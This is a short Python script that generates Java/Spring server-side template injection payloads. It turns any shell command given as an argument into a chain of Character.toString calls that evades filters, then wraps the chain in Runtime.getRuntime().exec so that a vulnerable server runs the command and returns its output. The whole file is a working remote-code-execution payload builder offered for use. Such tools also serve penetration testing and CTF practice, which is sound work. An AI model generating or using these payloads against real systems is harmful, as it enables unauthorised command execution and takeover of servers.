import sys

#this is very clunky code, but it works for java SSTI translation

command=sys.argv[1]

payload='*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
charwrapper='(T(java.lang.Character).toString('
endcharwrapper=')).concat'
endpayload='))).getInputStream())}'

firstLetter=True
for letter in command:
	if(firstLetter):
		charWrapped=charwrapper+str(ord(letter))+').concat'
		payload+=charWrapped
		firstLetter=False
	else:
		charWrapped=charwrapper+str(ord(letter))+endcharwrapper
		payload+=charWrapped

endStrings=len(payload)-len(endcharwrapper)
payload=payload[0:endStrings]
payload+=endpayload

print(payload)